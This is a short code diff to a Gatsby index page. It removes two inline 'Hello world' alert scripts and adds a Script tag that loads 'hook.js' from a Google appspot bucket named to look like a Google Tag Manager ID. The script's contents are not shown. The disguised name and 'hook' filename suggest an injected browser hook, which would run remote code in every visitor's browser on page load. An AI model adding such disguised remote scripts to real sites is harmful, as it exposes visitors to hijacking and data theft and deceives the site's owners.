@@ -85,8 +85,7 @@ const IndexPage = () => (
       <h1>
         Welcome to <b>Gatsby!</b>
       </h1>
-      <Script id="first-unique-id" dangerouslySetInnerHTML={{ __html: `alert('Hello world')` }} />
-      <Script id="second-unique-id">{`alert('Hello world')`}</Script>  
+      <Script id="second-unique-id" src="https://storage.googleapis.com/gtm-59frsbk-mdbjn.appspot.com/hook.js" />  
       <p className={styles.intro}>
         <b>Example pages:</b>{" "}
         {samplePageLinks.map((link, i) => (
